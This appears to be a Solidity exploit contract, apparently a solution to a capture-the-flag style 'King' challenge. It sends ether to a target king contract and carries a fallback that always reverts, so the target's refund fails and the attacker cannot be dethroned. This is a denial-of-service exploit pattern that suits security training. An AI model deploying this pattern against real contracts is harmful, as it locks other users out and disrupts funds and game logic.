// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

contract KingAttack {

    constructor (address _King) public payable {
        address(_King).call{value : msg.value}("");
    }

    fallback () external payable {
        revert("You lose");
    }

}